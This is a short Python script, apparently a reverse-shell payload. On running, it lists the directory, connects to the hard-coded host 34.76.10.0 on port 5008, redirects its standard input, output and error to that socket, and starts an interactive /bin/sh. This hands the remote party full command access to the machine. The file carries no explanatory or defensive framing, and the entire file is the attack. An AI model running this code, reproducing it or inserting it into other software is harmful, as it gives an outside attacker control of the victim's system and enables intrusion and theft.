#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import subprocess
import os

os.system("ls")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('34.76.10.0', 5008))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])

